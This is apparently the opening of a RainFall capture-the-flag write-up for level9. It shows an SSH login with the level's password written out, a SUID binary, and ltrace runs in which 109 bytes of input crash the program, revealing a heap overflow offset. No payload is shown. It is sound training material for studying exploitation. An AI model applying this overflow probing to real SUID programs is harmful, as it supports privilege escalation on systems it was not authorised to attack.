Login as `level9`.
```shell
┌──$ [~/42/2021/rainfall]
└─>  ssh 192.168.0.30 -p 4242 -l level9
level8@192.168.0.30's password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
A `SUID` executable is located in the home directory.
```shell
level9@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```

```shell
level9@RainFall:~$ ltrace ./level9 `python -c "print 'a'*108"`
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 108
memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 108) = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 0x61616167, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 103) +++
level9@RainFall:~$
level9@RainFall:~$ ltrace ./level9 `python -c "print 'a'*109"`
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)     = 109
memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 109) = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
